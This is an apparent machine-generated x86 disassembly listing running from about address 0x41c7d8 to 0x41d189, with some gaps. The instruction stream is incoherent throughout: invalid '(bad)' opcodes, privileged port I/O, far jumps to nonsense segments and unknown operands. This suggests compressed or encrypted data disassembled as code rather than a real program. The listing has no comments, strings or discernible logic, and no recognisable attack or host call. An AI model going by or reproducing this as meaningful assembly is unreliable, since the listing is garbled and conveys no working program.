  41c7d8:	sbb    eax,0x63d4b68
  41c7dd:	adc    BYTE PTR [edx+0x4568afd5],ah
  41c7e3:	les    ebp,FWORD PTR [ecx]
  41c7e5:	inc    ecx
  41c7e6:	adc    ecx,DWORD PTR [edx+0x49]
  41c7e9:	fcmovu st,st(1)
  41c7eb:	inc    esp
  41c7ec:	or     ebp,DWORD PTR [esi]
  41c7ee:	call   0xc7faaa20
  41c7f3:	push   edi
  41c7f4:	push   ebp
  41c7f5:	mov    ah,0x98
  41c7f7:	ins    BYTE PTR es:[edi],dx
  41c7f8:	adc    BYTE PTR [ebp-0xf],cl
  41c7fb:	(bad)  
  41c7fc:	stos   BYTE PTR es:[edi],al
  41c7fd:	xlat   BYTE PTR ds:[ebx]
  41c7fe:	xchg   ebx,eax
  41c7ff:	aaa    
  41c800:	cld    
  41c801:	and    eax,0xc1e3c42f
  41c806:	mov    esi,0x232e96e6
  41c80b:	(bad)  
  41c80c:	popf   
  41c80d:	es enter 0xf6ca,0xda
  41c812:	scas   eax,DWORD PTR es:[edi]
  41c813:	int    0x5f
  41c815:	test   al,0xc0
  41c817:	cld    
  41c818:	and    ah,BYTE PTR [ebx]
  41c81a:	pop    edx
  41c81b:	push   esi
  41c81c:	mov    cl,0x8a
  41c81e:	sub    esp,edx
  41c820:	out    dx,eax
  41c821:	pop    ebx
  41c822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c823:	pop    edx
  41c824:	pop    esp
  41c825:	pop    ss
  41c826:	out    0xbf,eax
  41c828:	cmp    BYTE PTR [edx+eiz*4-0x1e],al
  41c82c:	sbb    al,0x64
  41c82e:	mov    ds:0x8b188164,al
  41c833:	or     ebp,DWORD PTR ds:0x28646f42
  41c839:	adc    DWORD PTR [edi],ecx
  41c83b:	and    ah,BYTE PTR [ebx]
  41c83d:	fist   WORD PTR [ecx-0x6d]
  41c840:	inc    edx
  41c841:	inc    ebx
  41c842:	popf   
  41c843:	sar    BYTE PTR [esi+ebx*4],cl
  41c846:	repnz mov WORD PTR [ecx*4+0x1f531fb2],?
  41c84e:	cmp    al,0x54
  41c850:	test   al,0xfe
  41c852:	fild   WORD PTR [ecx+0x131a135e]
  41c858:	and    eax,0x1f274037
  41c85d:	pop    ss
  41c85e:	dec    esi
  41c85f:	add    BYTE PTR [ebp-0x66fc7238],bh
  41c865:	call   0xd73525db
  41c86a:	dec    ecx
  41c86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c86c:	dec    ecx
  41c86d:	out    dx,eax
  41c86e:	sahf   
  41c86f:	mov    fs,WORD PTR [ebx-0x29f5d993]
  41c875:	add    bh,BYTE PTR [ebx]
  41c877:	or     BYTE PTR [ecx+0x6cf67399],dh
  41c87d:	int    0x90
  41c87f:	and    al,0x83
  41c881:	and    BYTE PTR [edx],dl
  41c883:	fsubp  st(2),st
  41c885:	int    0x4d
  41c887:	lock jb 0x41c8b8
  41c88a:	imul   eax,esp,0xffffffb0
  41c88d:	xor    DWORD PTR [esi-0x1c],eax
  41c890:	fld    TBYTE PTR [ebx+0x3c5d15a7]
  41c896:	pop    esp
  41c897:	out    0x39,al
  41c899:	dec    esp
  41c89a:	fstp   TBYTE PTR [ebx+ebx*1-0x149e1d1c]
  41c8a1:	popa   
  41c8a2:	mov    bl,0x3f
  41c8a4:	push   ebx
  41c8a5:	sahf   
  41c8a6:	in     eax,0x58
  41c8a8:	push   cs
  41c8a9:	jge    0x41c880
  41c8ab:	xor    DWORD PTR [ebx+0x56d5a349],edx
  41c8b1:	or     eax,0x48640529
  41c8b6:	loope  0x41c852
  41c8b8:	pop    ecx
  41c8b9:	cdq    
  41c8ba:	jo     0x41c8b9
  41c8bc:	xchg   esi,edx
  41c8be:	fsub   DWORD PTR [edi+0x2a47]
	...
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	adc    al,0xf8
  41c942:	mov    al,BYTE PTR [eax+0x13458]
  41c948:	test   BYTE PTR [eax],0x0
  41c94b:	add    BYTE PTR [eax],bh
  41c94d:	and    cl,BYTE PTR [edi]
  41c94f:	in     eax,0x0
  41c951:	dec    ebx
  41c952:	inc    ebp
  41c953:	pop    ecx
  41c954:	addr16 icebp 
  41c956:	cmp    eax,0x2564108f
  41c95b:	mov    esi,edx
  41c95d:	loop   0x41c93c
  41c95f:	jnp    0x41c984
  41c961:	xlat   BYTE PTR ds:[ebx]
  41c962:	cmp    BYTE PTR [eax],0x3c
  41c965:	sbb    eax,0x561020f9
  41c96a:	pop    ecx
  41c96b:	rcr    DWORD PTR [edx-0x3c3b84ac],cl
  41c971:	push   0x4e4cfc31
  41c976:	shr    BYTE PTR [edi+0x2b0606d0],0x4e
  41c97d:	sti    
  41c97e:	xchg   ecx,eax
  41c97f:	mov    al,dl
  41c981:	punpckhbw mm1,QWORD PTR [eax+0x1fd9a897]
  41c988:	loope  0x41c9c1
  41c98a:	mov    dh,0x1f
  41c98c:	cdq    
  41c98d:	sbb    al,0xa3
  41c98f:	bound  esi,QWORD PTR [eax]
  41c991:	jne    0x41c9f3
  41c993:	shr    DWORD PTR [esi+0x3173480c],0xe6
  41c99a:	xor    bl,dl
  41c99c:	es xchg edi,eax
  41c99e:	xor    eax,0x690f9a94
  41c9a3:	imul   edi,DWORD PTR [esi+0x1e],0x8a63f3b8
  41c9aa:	stc    
  41c9ab:	add    BYTE PTR [ebp-0x64833d9d],ch
  41c9b1:	mov    esp,0x591bd4c3
  41c9b6:	imul   esp,DWORD PTR [edi],0x64682c4a
  41c9bc:	icebp  
  41c9bd:	xchg   ebp,eax
  41c9be:	mov    dl,0x37
  41c9c0:	jae    0x41c952
  41c9c2:	mov    ch,0x91
  41c9c4:	test   BYTE PTR [eax],ch
  41c9c6:	pop    ss
  41c9c7:	mov    dl,0x64
  41c9c9:	mov    dh,0xb2
  41c9cb:	sahf   
  41c9cc:	xchg   ecx,eax
  41c9cd:	leave  
  41c9ce:	fwait
  41c9cf:	jle    0x41ca34
  41c9d1:	aad    0xfe
  41c9d3:	pop    edi
  41c9d4:	fbld   TBYTE PTR [ecx+0x70]
  41c9d7:	int3   
  41c9d8:	aas    
  41c9d9:	outs   dx,BYTE PTR ds:[esi]
  41c9da:	fdiv   st,st(6)
  41c9dc:	jg     0x41c9dd
  41c9de:	sub    eax,0x87528291
  41c9e3:	mov    ?,WORD PTR [ebp-0xb]
  41c9e6:	mov    dh,0x97
  41c9e8:	add    BYTE PTR [esi-0x7],0x9a
  41c9ec:	mov    ch,0xe
  41c9ee:	pop    ebx
  41c9ef:	adc    eax,0x11443b92
  41c9f4:	aaa    
  41c9f5:	jo     0x41ca1d
  41c9f7:	sbb    eax,0x93874ac6
  41c9fc:	or     al,0x7e
  41c9fe:	fisubr WORD PTR [ecx+0x7b]
  41ca01:	rol    DWORD PTR [ecx+edx*4-0x31f20449],cl
  41ca08:	test   DWORD PTR ss:[esi],0x10202c11
  41ca0f:	sub    eax,0xc4125c74
  41ca14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca15:	xchg   DWORD PTR [edi+eiz*8-0x17222a85],ebx
  41ca1c:	fbstp  TBYTE PTR [ebx-0x8]
  41ca1f:	xchg   edi,eax
  41ca20:	adc    DWORD PTR [ecx+ebp*2+0x41],eax
  41ca24:	in     al,0xa0
  41ca26:	jecxz  0x41c9cf
  41ca28:	dec    esi
  41ca29:	in     eax,dx
  41ca2a:	and    DWORD PTR [edx],0xffffffd7
  41ca2d:	sbb    bh,BYTE PTR [ecx+ebx*8]
  41ca30:	inc    esi
  41ca31:	sub    DWORD PTR [ebp+0x38fa4430],ebx
  41ca37:	repz rol DWORD PTR [ebp-0x3fdf19e5],cl
  41ca3e:	lods   eax,DWORD PTR ds:[esi]
  41ca3f:	fst    DWORD PTR [ebx]
	...
  41cab1:	add    BYTE PTR [eax],al
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0xebe2887e
  41cac1:	les    edx,FWORD PTR [ecx+edx*1+0x4e]
  41cac5:	xor    eax,0xf60001
  41caca:	add    BYTE PTR [eax],al
  41cacc:	cmp    BYTE PTR [esi-0x7a],dl
  41cacf:	sbb    esp,DWORD PTR [eax]
  41cad1:	das    
  41cad2:	stc    
  41cad3:	dec    ecx
  41cad4:	mov    ah,0x52
  41cad6:	lea    ecx,[eax]
  41cad8:	jmp    0xcd96:0xba70653a
  41cadf:	add    al,0x5c
  41cae1:	mov    ?,ecx
  41cae3:	fisub  WORD PTR [ebp-0x6b2e7b8b]
  41cae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caea:	es in  eax,0x9b
  41caed:	cwde   
  41caee:	mov    ebx,0xec36940d
  41caf3:	stc    
  41caf4:	out    0x81,eax
  41caf6:	mov    ds:0xb3d944db,eax
  41cafb:	mov    ecx,DWORD PTR [edx+ebp*1-0x2e297e6a]
  41cb02:	fmul   QWORD PTR [esi+0x1f]
  41cb05:	gs dec edx
  41cb07:	xchg   ebp,eax
  41cb08:	inc    eax
  41cb09:	in     al,dx
  41cb0a:	loopne 0x41cae7
  41cb0c:	in     eax,0x4c
  41cb0e:	xor    ch,BYTE PTR [eax-0x58]
  41cb11:	dec    edi
  41cb12:	push   ds
  41cb13:	es mov al,0x7a
  41cb16:	call   0x3fdee08c
  41cb1b:	pop    es
  41cb1c:	stos   BYTE PTR es:[edi],al
  41cb1d:	xchg   ebx,eax
  41cb1e:	mov    edx,esp
  41cb20:	ret    
  41cb21:	sbb    BYTE PTR [esi],dl
  41cb23:	add    ebp,DWORD PTR [ebx-0x31]
  41cb26:	out    0x3a,eax
  41cb28:	stc    
  41cb29:	jns    0x41cb26
  41cb2b:	xchg   ebp,eax
  41cb2c:	xchg   esi,eax
  41cb2d:	sub    eax,0x1cdf60c4
  41cb32:	mov    al,0x9b
  41cb34:	inc    edx
  41cb35:	in     al,0xfa
  41cb37:	cwde   
  41cb38:	sub    BYTE PTR [ecx],bl
  41cb3a:	pop    esi
  41cb3b:	stos   BYTE PTR es:[edi],al
  41cb3c:	aas    
  41cb3d:	adc    dh,BYTE PTR ds:0x36d4c12b
  41cb43:	jns    0x41cb38
  41cb45:	xlat   BYTE PTR ds:[ebx]
  41cb46:	sub    DWORD PTR [ebp-0x3c8c5cc5],0x86dabd7b
  41cb50:	xchg   esp,eax
  41cb51:	mov    bh,0x80
  41cb53:	(bad)  
  41cb54:	cld    
  41cb55:	loop   0x41cba0
  41cb57:	out    dx,al
  41cb58:	mov    edx,0xd0c1a4a2
  41cb5d:	push   0xc1b18960
  41cb62:	repz xchg ecx,eax
  41cb64:	test   BYTE PTR [edx+0x132cda27],0x7e
  41cb6b:	data16 jecxz 0x41caef
  41cb6e:	jl     0x41cbe1
  41cb70:	jo     0x41cb93
  41cb72:	xor    ecx,DWORD PTR [edi]
  41cb74:	(bad)  
  41cb75:	ja     0x41cbbe
  41cb77:	ficom  DWORD PTR [ecx]
  41cb79:	jg     0x41cbb0
  41cb7b:	cmp    dh,BYTE PTR [eax]
  41cb7d:	sahf   
  41cb7e:	adc    eax,0x1a85a159
  41cb83:	add    eax,0x8d1f7355
  41cb88:	jg     0x41cb10
  41cb8a:	pop    edx
  41cb8b:	push   ds
  41cb8c:	int3   
  41cb8d:	and    eax,DWORD PTR [ebp+0x33994cc5]
  41cb93:	pop    eax
  41cb94:	mov    al,0x3b
  41cb96:	jae    0x41cb7a
  41cb98:	or     eax,0x5917e25d
  41cb9d:	cmp    DWORD PTR [esp+eax*4],esi
  41cba0:	pop    ebx
  41cba1:	repnz ds loope 0x41cb92
  41cba5:	loope  0x41cbd6
  41cba7:	inc    esi
  41cba8:	push   ebp
  41cba9:	fwait
  41cbaa:	adc    bl,BYTE PTR [edx+edi*8]
  41cbad:	jbe    0x41cbcf
  41cbaf:	imul   ebp,esp,0x3e
  41cbb2:	mov    ecx,0x34aecafa
  41cbb7:	push   ds
  41cbb8:	mov    edi,0x8ce05a74
  41cbbd:	mov    ebx,0xcba633a4
	...
  41cc32:	add    BYTE PTR [eax],al
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0xfd
  41cc41:	imul   BYTE PTR [edi+0x1364430]
  41cc47:	add    dh,dh
  41cc49:	add    BYTE PTR [eax],al
  41cc4b:	add    dh,ah
  41cc4d:	je     0x41cca9
  41cc4f:	xchg   ebp,eax
  41cc50:	push   esp
  41cc51:	jge    0x41ccb9
  41cc53:	dec    ecx
  41cc54:	bound  ebp,QWORD PTR [esi]
  41cc56:	jns    0x41ccb7
  41cc58:	xchg   esi,eax
  41cc59:	div    BYTE PTR [esi]
  41cc5b:	lods   al,BYTE PTR ds:[esi]
  41cc5c:	dec    edi
  41cc5d:	lea    esi,[eax-0x47]
  41cc60:	mov    BYTE PTR ds:0x12da1058,al
  41cc66:	cmp    dl,bl
  41cc68:	push   eax
  41cc69:	aaa    
  41cc6a:	push   esi
  41cc6b:	or     BYTE PTR [edx],dl
  41cc6d:	daa    
  41cc6e:	mov    ds:0xee801997,al
  41cc73:	sahf   
  41cc74:	mov    cl,BYTE PTR [edi+0x403542e2]
  41cc7a:	sbb    ch,BYTE PTR [edi-0x37]
  41cc7d:	es cld 
  41cc7f:	ror    DWORD PTR ds:0xdff9d94,1
  41cc85:	sub    eax,0xf0195c4a
  41cc8a:	les    ebp,FWORD PTR cs:[ebp+0x5a38bf28]
  41cc91:	mov    ah,0xa4
  41cc93:	push   es
  41cc94:	mov    bl,0x1
  41cc96:	mov    ah,0xb8
  41cc98:	jge    0x41cccf
  41cc9a:	(bad)  
  41cc9b:	stos   BYTE PTR es:[edi],al
  41cc9c:	cmp    DWORD PTR [ebp-0x3],esi
  41cc9f:	xor    ecx,esi
  41cca1:	repz xchg ecx,eax
  41cca3:	xlat   BYTE PTR ds:[ebx]
  41cca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cca5:	out    0x25,al
  41cca7:	or     BYTE PTR [edx+0x410ad4f0],dl
  41ccad:	cmc    
  41ccae:	sub    BYTE PTR [esi+0x71],bl
  41ccb1:	mov    ch,dl
  41ccb3:	cli    
  41ccb4:	rcl    DWORD PTR [ebp+eax*2+0x2e],1
  41ccb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb9:	jae    0x41cc9a
  41ccbb:	shr    DWORD PTR [ebp+0x70],cl
  41ccbe:	and    dl,BYTE PTR [eax+0xdb9c2cd]
  41ccc4:	or     esp,edx
  41ccc6:	rcr    DWORD PTR [edx],0x1f
  41ccc9:	or     edi,DWORD PTR [esi-0x208017e2]
  41cccf:	mov    edi,0x5f7485f8
  41ccd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd5:	outs   dx,DWORD PTR ds:[esi]
  41ccd6:	jne    0x41cca9
  41ccd8:	shl    bl,0x3d
  41ccdb:	les    esp,FWORD PTR [eax+edi*2]
  41ccde:	loop   0x41cd28
  41cce0:	mov    ebx,0xefc11202
  41cce5:	add    eax,0xf54d9a69
  41ccea:	outs   dx,DWORD PTR ds:[esi]
  41cceb:	in     eax,dx
  41ccec:	in     eax,0x3b
  41ccee:	jns    0x41cd40
  41ccf0:	or     eax,0x36ac7528
  41ccf5:	jno    0x41cd4b
  41ccf7:	mov    bh,0xe0
  41ccf9:	sub    eax,ebx
  41ccfb:	lds    esi,FWORD PTR [esi+0x42]
  41ccfe:	xchg   DWORD PTR [eax+0x29],edi
  41cd01:	ret    
  41cd02:	loope  0x41cd83
  41cd04:	push   eax
  41cd05:	xor    edi,DWORD PTR [ebp-0x5b]
  41cd08:	push   ebx
  41cd09:	mov    dh,0x98
  41cd0b:	loopne 0x41ccaa
  41cd0d:	das    
  41cd0e:	cmp    ch,dl
  41cd10:	sbb    esi,DWORD PTR [esi-0x7c]
  41cd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd14:	jne    0x41ccb9
  41cd16:	inc    eax
  41cd17:	scas   eax,DWORD PTR es:[edi]
  41cd18:	int    0xea
  41cd1a:	and    DWORD PTR [edx],esp
  41cd1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd1d:	xlat   BYTE PTR ds:[ebx]
  41cd1e:	jne    0x41cd59
  41cd20:	or     BYTE PTR [esp],cl
  41cd23:	mov    ch,0x62
  41cd25:	stc    
  41cd26:	jne    0x41cca9
  41cd28:	sbb    al,0xd8
  41cd2a:	xchg   ebp,eax
  41cd2b:	and    al,0xe5
  41cd2d:	cmp    dh,BYTE PTR [ebp+0x53]
  41cd30:	cld    
  41cd31:	xchg   ecx,eax
  41cd32:	jne    0x41cd67
  41cd34:	es sub cl,ch
  41cd37:	jmp    DWORD PTR [ecx-0x3eb3d949]
  41cd3d:	jbe    0x41cce8
  41cd3f:	gs or  al,0x0
	...
  41cdb3:	add    BYTE PTR [ebp-0x63956373],al
  41cdb9:	jnp    0x41cdb2
  41cdbb:	out    dx,eax
  41cdbc:	push   ebp
  41cdbd:	call   0x3054:0xef02b1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [ecx+edx*2],ah
  41cdce:	scas   al,BYTE PTR es:[edi]
  41cdcf:	gs scas eax,DWORD PTR es:[edi]
  41cdd1:	call   0x773f:0xed8b105b
  41cdd8:	fdivr  st,st(0)
  41cdda:	adc    al,0x9e
  41cddc:	pop    ecx
  41cddd:	ficom  WORD PTR [esi-0x1f]
  41cde0:	xlat   BYTE PTR ds:[ebx]
  41cde1:	sub    bh,BYTE PTR [esi-0x19aeec20]
  41cde7:	aaa    
  41cde8:	inc    ecx
  41cde9:	aad    0x51
  41cdeb:	and    BYTE PTR [esi+edx*4-0x58],bh
  41cdef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf0:	inc    edx
  41cdf1:	(bad)  
  41cdf2:	sbb    eax,0x73838153
  41cdf7:	repnz dec eax
  41cdf9:	in     eax,dx
  41cdfa:	sbb    BYTE PTR [ebp+0x782f31d0],dl
  41ce00:	adc    BYTE PTR [esi],al
  41ce02:	jl     0x41cdae
  41ce04:	dec    edx
  41ce05:	hlt    
  41ce06:	push   edx
  41ce07:	mov    eax,ds:0x4aae7c45
  41ce0c:	inc    ebp
  41ce0d:	ins    BYTE PTR es:[edi],dx
  41ce0e:	jmp    0xf838:0xb6d5451a
  41ce15:	sub    BYTE PTR [esi+0x70],ch
  41ce18:	adc    cl,0x16
  41ce1b:	fdiv   st(3),st
  41ce1d:	sub    BYTE PTR [edx-0x5b],ah
  41ce20:	out    dx,al
  41ce21:	jb     0x41ce6c
  41ce23:	xchg   DWORD PTR [edx-0x66f26e2b],ecx
  41ce29:	fidivr DWORD PTR [bx+si]
  41ce2c:	xor    ch,bl
  41ce2e:	pop    eax
  41ce2f:	ss cmp eax,0x11c23569
  41ce35:	sbb    ebp,edx
  41ce37:	push   edi
  41ce38:	in     eax,dx
  41ce39:	xor    eax,0xab1dacda
  41ce3e:	sub    eax,0x99c0ff32
  41ce43:	add    cl,dl
  41ce45:	mov    ds:0x9ed2b5fe,al
  41ce4a:	mov    edi,0xb6d5b826
  41ce4f:	xor    al,0x6d
  41ce51:	je     0x41ce7a
  41ce53:	add    al,0xcf
  41ce55:	int    0x7f
  41ce57:	mov    edi,0x6a6e0d27
  41ce5c:	jmp    0xa467ee3e
  41ce61:	out    dx,al
  41ce62:	(bad)  
  41ce63:	pop    eax
  41ce64:	mov    al,0xaf
  41ce66:	pop    ds
  41ce67:	xor    bl,BYTE PTR [edx+0x3105fbb7]
  41ce6d:	pop    ss
  41ce6e:	jg     0x41cecf
  41ce70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce71:	mov    cl,0x23
  41ce73:	rcr    BYTE PTR [edx],1
  41ce75:	dec    ecx
  41ce76:	cmp    ebx,DWORD PTR [edi+0xa6117fd]
  41ce7c:	or     al,0xf1
  41ce7e:	into   
  41ce7f:	mov    cl,0x88
  41ce81:	(bad)  
  41ce82:	in     eax,dx
  41ce83:	aam    0xbc
  41ce85:	or     edx,DWORD PTR [ecx]
  41ce87:	mov    eax,ecx
  41ce89:	xchg   ebp,eax
  41ce8a:	sub    BYTE PTR [eax-0x80],dh
  41ce8d:	mov    ds,ebp
  41ce8f:	bound  ebp,QWORD PTR [edx]
  41ce91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce92:	icebp  
  41ce93:	je     0x41ce31
  41ce95:	shr    esp,cl
  41ce97:	push   esp
  41ce98:	push   es
  41ce99:	sub    al,0x36
  41ce9b:	scas   eax,DWORD PTR es:[edi]
  41ce9c:	pop    esp
  41ce9d:	push   ebp
  41ce9e:	cwde   
  41ce9f:	and    dl,BYTE PTR [edx-0x7d]
  41cea2:	retf   
  41cea3:	popf   
  41cea4:	dec    eax
  41cea5:	add    DWORD PTR [ebx-0x7d],ebx
  41cea8:	or     eax,0xffffffe3
  41ceab:	nop
  41ceac:	test   eax,esp
  41ceae:	(bad)  
  41ceaf:	mov    ds:0xdcd69d21,al
  41ceb4:	jmp    0x86e43892
  41ceb9:	mov    al,ds:0xf39168b4
  41cebe:	and    dl,cl
  41cec0:	(bad)  
  41cec1:	mov    al,ds:0x0
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	xlat   BYTE PTR ds:[bx]
  41cf42:	pop    esi
  41cf43:	jno    0x41cf75
  41cf45:	cmp    BYTE PTR [ecx],al
  41cf47:	add    dh,dh
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [ebx-0x3d3350],dh
  41cf51:	fwait
  41cf52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf53:	or     ebp,DWORD PTR [esi+0x65472559]
  41cf59:	push   esp
  41cf5a:	cmc    
  41cf5b:	retf   0x56c7
  41cf5e:	or     eax,ebp
  41cf60:	mov    ?,WORD PTR [edi+0x1]
  41cf63:	add    al,0x9f
  41cf65:	mov    ds:0x9c313ace,al
  41cf6a:	rep ins BYTE PTR es:[edi],dx
  41cf6c:	ss and eax,0xbd982bda
  41cf72:	jo     0x41cf4a
  41cf74:	cwde   
  41cf75:	pop    es
  41cf76:	push   ebx
  41cf77:	in     al,dx
  41cf78:	xor    ah,BYTE PTR [ecx+edx*8]
  41cf7b:	ret    
  41cf7c:	adc    BYTE PTR [ecx],ah
  41cf7e:	inc    edx
  41cf7f:	rol    bl,0x34
  41cf82:	int3   
  41cf83:	jg     0x41cf4d
  41cf85:	xchg   esi,eax
  41cf86:	js     0x41cf7c
  41cf88:	jns    0x41cf9d
  41cf8a:	ss enter 0x71fe,0x86
  41cf8f:	or     DWORD PTR [eax],ebp
  41cf91:	inc    edi
  41cf92:	and    al,0x28
  41cf94:	jge    0x41cf9b
  41cf96:	clc    
  41cf97:	ja     0x41cff5
  41cf99:	in     al,dx
  41cf9a:	retf   0x99d2
  41cf9d:	pop    edi
  41cf9e:	mov    esi,0x76ce55ab
  41cfa3:	and    BYTE PTR [esi],dl
  41cfa5:	sbb    bl,BYTE PTR [eax+esi*2-0xd]
  41cfa9:	test   al,0x5e
  41cfab:	mov    ch,0x53
  41cfad:	or     BYTE PTR [ebp+0x2d],ah
  41cfb0:	aam    0xc0
  41cfb2:	push   ecx
  41cfb3:	rcr    BYTE PTR [eax+0x47a964e],1
  41cfb9:	pusha  
  41cfba:	and    DWORD PTR [edi+0x67],ecx
  41cfbd:	das    
  41cfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfbf:	mov    al,ds:0x6cc6bcde
  41cfc4:	or     al,0xde
  41cfc6:	dec    esi
  41cfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc8:	push   esi
  41cfc9:	retf   0xbe14
  41cfcc:	cmp    DWORD PTR [ebp-0x73],ebx
  41cfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfd0:	(bad)  
  41cfd2:	mov    ch,0xbe
  41cfd4:	mov    edx,0x8aa2c44a
  41cfd9:	ins    BYTE PTR es:[edi],dx
  41cfda:	jb     0x41cfee
  41cfdc:	into   
  41cfdd:	sub    eax,0x37dce777
  41cfe2:	fwait
  41cfe3:	bound  ebp,QWORD PTR [esi-0x16c33c3b]
  41cfe9:	jae    0x41cfa8
  41cfeb:	mov    al,ds:0xe061898
  41cff0:	xor    bl,bl
  41cff2:	push   0x37
  41cff4:	push   ebx
  41cff5:	enter  0xa620,0x32
  41cff9:	mov    al,ds:0x9e5d9e34
  41cffe:	push   edi
  41cfff:	jae    0x41d000
  41d001:	jb     0x41d00f
  41d003:	js     0x41cf99
  41d005:	mov    ah,0xdd
  41d007:	inc    esp
  41d009:	test   DWORD PTR [ecx+0x3c],ecx
  41d00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d00d:	dec    esp
  41d00e:	aad    0x1
  41d010:	or     edx,edx
  41d012:	pop    esp
  41d013:	xor    eax,0x630105d7
  41d018:	imul   ebp,esp,0xbc8f7817
  41d01e:	(bad)  
  41d020:	dec    edx
  41d021:	sub    DWORD PTR [esi-0xf],ebx
  41d024:	test   al,0xf1
  41d026:	xor    BYTE PTR [ebx+eiz*1+0x28],ch
  41d02a:	outs   dx,BYTE PTR ds:[esi]
  41d02b:	jo     0x41cfbc
  41d02d:	cwde   
  41d02e:	ret    0xb552
  41d031:	xor    BYTE PTR [eax+0x7561b6e0],ah
  41d037:	dec    esi
  41d038:	pop    edi
  41d039:	mov    bl,0xd0
  41d03b:	int    0xf5
  41d03d:	mov    cl,0x8
  41d03f:	dec    edx
  41d040:	in     al,dx
  41d041:	xor    al,BYTE PTR [eax]
	...
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx+0x2d80a798],0xffffffcd
  41d0c2:	test   DWORD PTR [edi],esp
  41d0c4:	cmp    DWORD PTR es:[ecx],eax
  41d0c7:	add    dh,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ecx],ch
  41d0cd:	cmp    eax,0xd646b344
  41d0d2:	mov    ds:0x1fcfcae0,al
  41d0d7:	push   ebx
  41d0d8:	jns    0x41d0e0
  41d0da:	lds    esp,FWORD PTR [edx+0x158d2091]
  41d0e0:	sbb    BYTE PTR [edx+0x5e],0xc2
  41d0e4:	inc    ebp
  41d0e5:	inc    edx
  41d0e6:	ins    BYTE PTR es:[edi],dx
  41d0e7:	mov    ds:0x7f76b9b3,al
  41d0ec:	xor    BYTE PTR [eax],0x33
  41d0ef:	push   edi
  41d0f0:	out    0xff,al
  41d0f2:	rol    dh,cl
  41d0f4:	pop    ebp
  41d0f5:	pop    ebx
  41d0f6:	sub    BYTE PTR [esi],al
  41d0f8:	sbb    esi,esp
  41d0fa:	out    dx,eax
  41d0fb:	mov    ah,0xfa
  41d0fd:	mov    WORD PTR [edx+ecx*8+0x5a8770e2],?
  41d104:	cld    
  41d105:	clc    
  41d106:	pop    es
  41d107:	lock sbb BYTE PTR [ecx+0x24],bh
  41d10b:	inc    ecx
  41d10c:	and    ch,BYTE PTR [ecx]
  41d10e:	hlt    
  41d10f:	inc    edx
  41d110:	jb     0x41d147
  41d112:	lea    ebp,[ebx-0x6250fcc]
  41d118:	and    BYTE PTR [eax-0x42],bh
  41d11b:	sar    BYTE PTR [ecx+0x3283c6d5],cl
  41d121:	push   ebx
  41d122:	ds adc al,0x4e
  41d125:	not    BYTE PTR [esi+0x50]
  41d128:	int    0xb3
  41d12a:	mov    bl,0x81
  41d12c:	hlt    
  41d12d:	mov    ch,BYTE PTR [edi]
  41d12f:	cmp    ebx,ebp
  41d131:	push   ss
  41d132:	pushf  
  41d133:	mov    ds:0xc92f3e48,al
  41d138:	idiv   ch
  41d13a:	push   0x8942b36a
  41d13f:	xor    bh,BYTE PTR [edi+0x3ea57fde]
  41d145:	sbb    eax,0xb0192934
  41d14a:	bswap  eax
  41d14c:	pop    ss
  41d14d:	adc    eax,0x1d17c8c0
  41d152:	scas   al,BYTE PTR es:[edi]
  41d153:	push   ebx
  41d154:	cmp    DWORD PTR [ebx+0x180ba788],eax
  41d15a:	je     0x41d12d
  41d15c:	sahf   
  41d15d:	inc    edi
  41d15e:	pop    edx
  41d15f:	push   esi
  41d160:	xchg   bl,al
  41d162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d163:	or     DWORD PTR [eax-0x2cc2ad25],eax
  41d169:	dec    ebx
  41d16a:	inc    ecx
  41d16b:	aas    
  41d16c:	xor    al,BYTE PTR [ebx]
  41d16e:	out    dx,eax
  41d16f:	pop    eax
  41d170:	push   ss
  41d171:	lds    ebp,FWORD PTR [edi+0x17]
  41d174:	cmp    eax,0x65d8ab5b
  41d179:	daa    
  41d17a:	dec    edi
  41d17b:	ret    0x71ae
  41d17e:	gs jae 0x41d151
  41d181:	ds and al,0xc9
  41d184:	ror    ah,1
  41d186:	fistp  WORD PTR [edx-0x7c]
  41d189:	ins    BYTE PTR es:[edi],dx
